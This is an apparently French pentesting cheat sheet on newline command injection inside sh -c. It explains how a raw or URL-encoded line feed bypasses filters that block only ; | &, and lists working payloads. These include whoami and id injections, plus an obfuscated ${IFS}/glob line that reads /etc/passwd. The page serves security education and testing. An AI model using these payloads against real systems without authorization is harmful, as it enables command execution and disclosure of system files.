---
order: 2
title: "Injection de saut de ligne : utiliser un retour à la ligne comme terminateur de commande dans sh -c"
description: "Injecter un saut de ligne brut ou encodé en URL (%0a, \\n) pour terminer la commande voulue et en démarrer une nouvelle à l'intérieur de sh -c, contournant les filtres qui ne bloquent que ; | &."
keywords:
  - injection de commande
  - injection de saut de ligne
  - line feed
  - "%0a"
  - contournement de filtre
  - sh -c
---

# Saut de ligne comme terminateur de commande

Les filtres bloquent fréquemment les séparateurs de shell évidents, `;`, `|`, `&`, tout en négligeant qu'un **saut de ligne est lui-même un terminateur de commande**. À l'intérieur de `sh -c "..."`, chaque ligne de la chaîne est parsée comme sa propre commande, exactement comme dans un fichier de script. Un unique line feed injecté termine la commande voulue et en commence une contrôlée par l'attaquant, sans aucun métacaractère interdit en vue.

## Pourquoi cela fonctionne

Quand un shell lit `ping -c 1 HOST`, la grammaire traite un saut de ligne de la même façon qu'elle traite `;` : il complète la commande simple courante. Si la valeur de l'attaquant devient `127.0.0.1\nwhoami`, le shell exécute `ping -c 1 127.0.0.1`, puis, sur la ligne suivante, `whoami`. Parce que `\n` est une structure de contrôle plutôt qu'un « caractère spécial » dans le modèle mental de l'auteur du filtre, il est régulièrement manqué.

## Payloads

Dans une requête HTTP, le saut de ligne est encodé en URL. Le line feed est `%0a` ; certaines stacks exigent ou acceptent aussi un retour chariot `%0d` :

```
127.0.0.1%0awhoami
127.0.0.1%0aid
127.0.0.1%0d%0awhoami
```

En octet brut (corps JSON, en-tête, ou un collage dans un terminal) c'est un saut de ligne littéral :

```
127.0.0.1
whoami
```

Dans les sinks de langage, la séquence d'échappement doit survivre jusque dans la chaîne finale avant que le shell ne la voie :

```
host = "127.0.0.1\nid"      # when the runtime unescapes before sh -c
```

## Association avec d'autres astuces

Le saut de ligne ne fournit que le séparateur. Si le mot-clé de la commande est aussi filtré, combinez-le avec la fragmentation de mots-clés ou un substitut d'espace `${IFS}` :

```
127.0.0.1%0awho${IFS}ami
127.0.0.1%0a/???/??t${IFS}/etc/passwd
```

## Notes de contexte

- La chaîne injectée doit atterrir dans un contexte **shell** (`sh -c`, `system()`, backticks). Un appel `argv` pur ne réinterprète pas le saut de ligne comme séparateur.
- `cmd.exe` ne traite pas un simple line feed comme séparateur de la même façon ; préférez-y `&`. La terminaison par saut de ligne est une technique de shell POSIX.
- Là où la réponse ne reflète rien, confirmez avec une deuxième commande temporelle ou out-of-band sur la nouvelle ligne.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour injecter des sauts de ligne bruts et encodés.
- **[commix](https://github.com/commixproject/commix)** : exploitation automatisée d'injection de commande.

## Références

- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
